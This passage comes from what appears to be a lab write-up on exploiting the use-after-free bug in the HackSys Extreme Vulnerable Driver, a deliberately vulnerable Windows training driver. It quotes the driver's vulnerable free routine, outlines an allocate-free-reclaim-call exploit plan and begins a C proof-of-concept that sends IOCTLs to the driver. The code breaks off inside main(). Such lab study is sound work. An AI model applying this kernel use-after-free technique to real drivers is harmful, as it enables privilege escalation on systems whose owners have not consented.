+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">222</span>         <span style="color:#66d9ef">if</span> (g_UseAfterFreeObjectNonPagedPool)
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">223</span>         {
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">224</span>             <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;[+] Freeing UaF Object</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">225</span>             <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;[+] Pool Tag: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">STRINGIFY</span>(POOL_TAG));
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span>             <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;[+] Pool Chunk: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, g_UseAfterFreeObjectNonPagedPool);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">227</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">228</span> <span style="color:#960050;background-color:#1e0010">#</span>ifdef SECURE
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">229</span>             <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">230</span>             <span style="color:#75715e">// Secure Note: This is secure because the developer is setting
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">231</span>             <span style="color:#75715e">// &#39;g_UseAfterFreeObjectNonPagedPool&#39; to NULL once the Pool chunk is being freed
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">232</span>             <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">233</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">234</span>             <span style="color:#a6e22e">ExFreePoolWithTag</span>((PVOID)g_UseAfterFreeObjectNonPagedPool, (ULONG)POOL_TAG);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">235</span>      
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">236</span>             <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">237</span>             <span style="color:#75715e">// Set to NULL to avoid dangling pointer
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">238</span>             <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">239</span>      
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">240</span>             g_UseAfterFreeObjectNonPagedPool <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">241</span> <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">242</span>             <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">243</span>             <span style="color:#75715e">// Vulnerability Note: This is a vanilla Use After Free vulnerability
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">244</span>             <span style="color:#75715e">// because the developer is not setting &#39;g_UseAfterFreeObjectNonPagedPool&#39; to NULL.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">245</span>             <span style="color:#75715e">// Hence, g_UseAfterFreeObjectNonPagedPool still holds the reference to stale pointer
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">246</span>             <span style="color:#75715e">// (dangling pointer)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">247</span>             <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">248</span>             
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">249</span>             <span style="color:#a6e22e">ExFreePoolWithTag</span>((PVOID)g_UseAfterFreeObjectNonPagedPool, (ULONG)POOL_TAG);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">250</span> <span style="color:#960050;background-color:#1e0010">#</span>endif      
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">251</span>             
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">252</span>             Status <span style="color:#f92672">=</span> STATUS_SUCCESS;
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">253</span>         }
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">254</span>     }
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">255</span>     <span style="color:#66d9ef">__except</span> (EXCEPTION_EXECUTE_HANDLER)
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">256</span>     {   
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">257</span>         Status <span style="color:#f92672">=</span> <span style="color:#a6e22e">GetExceptionCode</span>();
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">258</span>         <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;[-] Exception Code: 0x%X</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, Status);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">259</span>     }
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">260</span>     
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">261</span>     <span style="color:#66d9ef">return</span> Status;
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">262</span> }
+</span></span></code></pre></div><p>Here we see a call to a new Windows API the <code>ExFreePoolWithTag</code> function. This function simply deallocates a block of pool memory allocated with the specified tag (Hack), however we can see that the global variable <code>g_UseAfterFreeObjectNonPagedPool</code> is never made NULL. This means <code>g_UseAfterFreeObjectNonPagedPool</code> will contain a pointer to the free&rsquo;d object even after it&rsquo;s been free&rsquo;d. As the source mentions - a dangling pointer.</p>
+<h2 id="understanding-allocatefakeobjectnonpagedpoolioctlhandler">Understanding AllocateFakeObjectNonPagedPoolIoctlHandler</h2>
+<p>Looking at this handler we can see it takes some user input on line <strong>441</strong>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">429</span> NTSTATUS
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">430</span> <span style="color:#a6e22e">AllocateFakeObjectNonPagedPoolIoctlHandler</span>(
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">431</span>     _In_ PIRP Irp,
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">432</span>     _In_ PIO_STACK_LOCATION IrpSp
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">433</span> )           
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">434</span> {           
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">435</span>     NTSTATUS Status <span style="color:#f92672">=</span> STATUS_UNSUCCESSFUL;
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">436</span>     PFAKE_OBJECT_NON_PAGED_POOL UserFakeObject <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">437</span>             
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">438</span>     <span style="color:#a6e22e">UNREFERENCED_PARAMETER</span>(Irp);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">439</span>     <span style="color:#a6e22e">PAGED_CODE</span>();
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">440</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">441</span>     UserFakeObject <span style="color:#f92672">=</span> (PFAKE_OBJECT_NON_PAGED_POOL)IrpSp<span style="color:#f92672">-&gt;</span>Parameters.DeviceIoControl.Type3InputBuffer;
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">442</span>     
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">443</span>     <span style="color:#66d9ef">if</span> (UserFakeObject)
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">444</span>     {   
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">445</span>         Status <span style="color:#f92672">=</span> <span style="color:#a6e22e">AllocateFakeObjectNonPagedPool</span>(UserFakeObject);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">446</span>     }
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">447</span>     
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">448</span>     <span style="color:#66d9ef">return</span> Status;
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">449</span> }
+</span></span></code></pre></div><p>From here, we call <code>AllocateFakeObjectNonPagedPool</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">270</span> NTSTATUS
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">271</span> <span style="color:#a6e22e">AllocateFakeObjectNonPagedPool</span>(
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">272</span>     _In_ PFAKE_OBJECT_NON_PAGED_POOL UserFakeObject
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">273</span> )
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">274</span> {
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">275</span>     NTSTATUS Status <span style="color:#f92672">=</span> STATUS_SUCCESS;
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">276</span>     PFAKE_OBJECT_NON_PAGED_POOL KernelFakeObject <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">277</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">278</span>     <span style="color:#a6e22e">PAGED_CODE</span>();
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">279</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">280</span>     <span style="color:#66d9ef">__try</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">281</span>     {
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">282</span>         <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;[+] Creating Fake Object</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">283</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">284</span>         <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">285</span>         <span style="color:#75715e">// Allocate Pool chunk
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">286</span>         <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">287</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">288</span>         KernelFakeObject <span style="color:#f92672">=</span> (PFAKE_OBJECT_NON_PAGED_POOL)<span style="color:#a6e22e">ExAllocatePoolWithTag</span>(
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">289</span>             NonPagedPool,
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">290</span>             <span style="color:#66d9ef">sizeof</span>(FAKE_OBJECT_NON_PAGED_POOL),
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">291</span>             (ULONG)POOL_TAG
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">292</span>         );
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">293</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">294</span>         <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>KernelFakeObject)
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">295</span>         {   
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">296</span>             <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">297</span>             <span style="color:#75715e">// Unable to allocate Pool chunk
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">298</span>             <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">299</span>             
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">300</span>             <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;[-] Unable to allocate Pool chunk</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">301</span>             
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">302</span>             Status <span style="color:#f92672">=</span> STATUS_NO_MEMORY;
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">303</span>             <span style="color:#66d9ef">return</span> Status;
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">304</span>         }
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">305</span>         <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">306</span>         {   
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">307</span>             <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;[+] Pool Tag: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">STRINGIFY</span>(POOL_TAG));
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">308</span>             <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;[+] Pool Type: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">STRINGIFY</span>(NonPagedPool));
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">309</span>             <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;[+] Pool Size: 0x%X</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#66d9ef">sizeof</span>(FAKE_OBJECT_NON_PAGED_POOL));
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">310</span>             <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;[+] Pool Chunk: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, KernelFakeObject);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">311</span>         }
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">312</span>         
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">313</span>         <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">314</span>         <span style="color:#75715e">// Verify if the buffer resides in user mode
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">315</span>         <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">316</span>         
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">317</span>         <span style="color:#a6e22e">ProbeForRead</span>(
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">318</span>             (PVOID)UserFakeObject,
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">319</span>             <span style="color:#66d9ef">sizeof</span>(FAKE_OBJECT_NON_PAGED_POOL),
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">320</span>             (ULONG)<span style="color:#a6e22e">__alignof</span>(UCHAR)
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">321</span>         );
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">322</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">323</span>         <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">324</span>         <span style="color:#75715e">// Copy the Fake structure to Pool chunk
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">325</span>         <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">326</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">327</span>         <span style="color:#a6e22e">RtlCopyMemory</span>(
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">328</span>             (PVOID)KernelFakeObject,
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">329</span>             (PVOID)UserFakeObject,
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">330</span>             <span style="color:#66d9ef">sizeof</span>(FAKE_OBJECT_NON_PAGED_POOL)
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">331</span>         );
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">332</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">333</span>         <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">334</span>         <span style="color:#75715e">// Null terminate the char buffer
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">335</span>         <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">336</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">337</span>         KernelFakeObject<span style="color:#f92672">-&gt;</span>Buffer[<span style="color:#66d9ef">sizeof</span>(KernelFakeObject<span style="color:#f92672">-&gt;</span>Buffer) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\0&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">338</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">339</span>         <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;[+] Fake Object: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, KernelFakeObject);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">340</span>     }
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">341</span>     <span style="color:#66d9ef">__except</span> (EXCEPTION_EXECUTE_HANDLER)
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">342</span>     {
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">343</span>         Status <span style="color:#f92672">=</span> <span style="color:#a6e22e">GetExceptionCode</span>();
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">344</span>         <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;[-] Exception Code: 0x%X</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, Status);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">345</span>     }
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">346</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">347</span>     <span style="color:#66d9ef">return</span> Status;
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">348</span> }
+</span></span></code></pre></div><p>Let&rsquo;s break this down:</p>
+<ul>
+<li>Lines 288-311 we allocate a chunk just as before, but this time it&rsquo;s a &ldquo;fake object&rdquo;. Just looking at the structure, it&rsquo;s the same size as the PUSE_AFTER_FREE_NON_PAGED_POOL object</li>
+<li>Lines 317-321 we see a new Windows API ProbeForRead which checks that the user-mode buffer is correctly aligned.</li>
+<li>Lines 327-331 we RtlCopyMemory / move the usermode buffer into the fake object allocation</li>
+<li>Lines 333-347 we NULL terminate the buffer and return.</li>
+</ul>
+<p>For reference this is the fake object:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span> <span style="color:#ae81ff">68</span> <span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _FAKE_OBJECT_NON_PAGED_POOL
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">69</span> {
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">70</span>     CHAR Buffer[<span style="color:#ae81ff">0x58</span>];
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">71</span> } FAKE_OBJECT_NON_PAGED_POOL, <span style="color:#f92672">*</span>PFAKE_OBJECT_NON_PAGED_POOL;
+</span></span></code></pre></div><p>Noice, if you&rsquo;re familiar with user mode exploitation your eyes are probably lit up by now.</p>
+<h1 id="summary-of-functions">Summary of Functions</h1>
+<p>In short this is what the functions do:</p>
+<table>
+<thead>
+<tr>
+<th>Function</th>
+<th>Summary</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>AllocateUaFObjectNonPagedPoolIoctlHandler</td>
+<td>We&rsquo;re just allocating some memory (executable) to hold the <code>PUSE_AFTER_FREE_NON_PAGED_POOL</code> structure, fill the Buffer member (char array), and set the Callback member (function pointer)</td>
+</tr>
+<tr>
+<td>UseUaFObjectNonPagedPoolIoctlHandler</td>
+<td>Calls the Callback function pointer from the global variable <code>g_UseAfterFreeObjectNonPagedPool</code></td>
+</tr>
+<tr>
+<td>FreeUaFObjectNonPagedPoolIoctlHandler</td>
+<td>Free&rsquo;s the <code>g_UseAfterFreeObjectNonPagedPool</code> object, and DOES NOT NULL out the variable (dangling pointer)</td>
+</tr>
+<tr>
+<td>AllocateFakeObjectNonPagedPoolIoctlHandler</td>
+<td>Allocates an object the same size as the original allocation, but with user-controlled input.</td>
+</tr>
+</tbody>
+</table>
+<p>Looking at this we have a classic UAF. Never done a Windows UAF but I&rsquo;m assuming that the fake object will take the previously allocated memories space. To exploit this in theory all we need to do is:</p>
+<ol>
+<li>Allocate a <code>USE_AFTER_FREE_NON_PAGED_POOL</code> object</li>
+<li>Free the object</li>
+<li>Allocate a <code>FAKE_OBJECT_NON_PAGED_POOL</code> object (reclaiming freed memory)</li>
+<li>Call <code>g_UseAfterFreeObjectNonPagedPool.Callback</code> which should point to the corrupted structure</li>
+</ol>
+<h1 id="exploitation">Exploitation</h1>
+<p>From here writing a PoC seemed pretty straightforward, and since we had source this should be pretty easy (object size wise).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;psapi.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define IOCTL(Function) CTL_CODE (FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define HEVD_ALLOCATE_ROBJ IOCTL(0x804)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define HEVD_CALL_FPTR     IOCTL(0x805)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define HEVD_FREE          IOCTL(0x806)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define HEVD_ALLOCATE_FOBJ IOCTL(0x807)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _FAKE_OBJECT_NON_PAGED_POOL
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  CHAR Buffer[<span style="color:#ae81ff">0x58</span>];
+</span></span><span style="display:flex;"><span>} FAKE_OBJECT_NON_PAGED_POOL, <span style="color:#f92672">*</span>PFAKE_OBJECT_NON_PAGED_POOL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">sendIoctl</span>(HANDLE hHEVD, DWORD dIoctl, CHAR <span style="color:#f92672">*</span>pBuffer, DWORD dBuffer)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  DWORD bytesReturned <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Calling IOCTL Code 0x%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, dIoctl);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">DeviceIoControl</span>(hHEVD,
+</span></span><span style="display:flex;"><span>                  dIoctl,
+</span></span><span style="display:flex;"><span>                  pBuffer,
+</span></span><span style="display:flex;"><span>                  dBuffer,
+</span></span><span style="display:flex;"><span>                  NULL,
+</span></span><span style="display:flex;"><span>                  <span style="color:#ae81ff">0x00</span>,
+</span></span><span style="display:flex;"><span>                  <span style="color:#f92672">&amp;</span>bytesReturned,
+</span></span><span style="display:flex;"><span>                  NULL);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">allocate_buffer</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buffer <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(<span style="color:#66d9ef">sizeof</span>(FAKE_OBJECT_NON_PAGED_POOL));
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (buffer <span style="color:#f92672">!=</span> NULL)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Allocated %d bytes (userland)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#66d9ef">sizeof</span>(FAKE_OBJECT_NON_PAGED_POOL));
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(buffer, <span style="color:#ae81ff">0x41</span>, <span style="color:#66d9ef">sizeof</span>(FAKE_OBJECT_NON_PAGED_POOL));
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> buffer;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  HANDLE hHEVD <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>evilBuffer <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  hHEVD <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreateFileA</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">HackSysExtremeVulnerableDriver&#34;</span>,
+</span></span><span style="display:flex;"><span>                      (GENERIC_READ <span style="color:#f92672">|</span> GENERIC_WRITE),
+</span></span><span style="display:flex;"><span>                      <span style="color:#ae81ff">0x00</span>,
+</span></span><span style="display:flex;"><span>                      NULL,
+</span></span><span style="display:flex;"><span>                      OPEN_EXISTING,
+</span></span><span style="display:flex;"><span>                      FILE_ATTRIBUTE_NORMAL,
+</span></span><span style="display:flex;"><span>                      NULL);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (hHEVD <span style="color:#f92672">==</span> INVALID_HANDLE_VALUE)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  evilBuffer <span style="color:#f92672">=</span> <span style="color:#a6e22e">allocate_buffer</span>();
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (evilBuffer <span style="color:#f92672">==</span> NULL)
+</span></span><span style="display:flex;"><span>  {
